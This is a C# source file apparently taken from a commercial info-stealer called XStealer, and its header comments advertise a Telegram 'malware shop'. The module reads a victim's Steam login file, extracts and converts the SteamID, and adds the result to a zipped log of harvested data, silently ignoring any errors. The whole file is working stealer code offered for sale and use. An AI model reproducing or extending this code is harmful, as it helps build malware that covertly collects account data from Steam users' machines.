// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Modules.Apps.Steam
{
    using System;
    using System.Globalization;
    using System.IO;
    using System.Text;
    using System.Text.RegularExpressions;
    using Helpers;

    public static class SteamProfiles
    {
        /// <summary>
        /// <br><b>RUS</b></br><br>Метод сохранения данных из Steam'а в массив байтов</br>
        /// <br><b>ENG</b></br><br>Method of saving data from Steam to a byte array</br>
        /// </summary>
        public static void GetSteamID()
        {
            // Поток для записи данных
            using var ms = new MemoryStream { Position = 0 };
            try
            {
                // Чтение данных из файла
                string ProfileNum = File.ReadAllLines(GlobalPaths.LoginFile)[2].Split('"')[1];
                // Проверка на совпадение по регулярке
                if (Regex.IsMatch(ProfileNum, SteamConverter.STEAM64))
                {
                    // Конвертируем данные
                    string ConvertID = SteamConverter.FromSteam64ToSteam2(Convert.ToInt64(ProfileNum));
                    string ConvertSteam3 = $"{SteamConverter.STEAMPREFIX}{SteamConverter.FromSteam64ToSteam32(Convert.ToInt64(ProfileNum)).ToString(CultureInfo.InvariantCulture)}";
                    // Записываем данные в поток
                    using var data = new StreamWriter(ms, Encoding.UTF8);
                    data.WriteLine($"Steam2 ID: {ConvertID}");
                    data.WriteLine($"Steam3 ID x32: {ConvertSteam3}");
                    data.WriteLine($"Steam3 ID x64: {ProfileNum}");
                    data.WriteLine($"{SteamConverter.HTTPS}{ProfileNum}");
                    data.Flush();
                    ZipEx.AddKeyPairStream("Steam/SteamID_Log.txt", ms?.ToArray() ?? ms.GetBuffer() ?? null);
                }
            }
            catch { }
        }
    }
}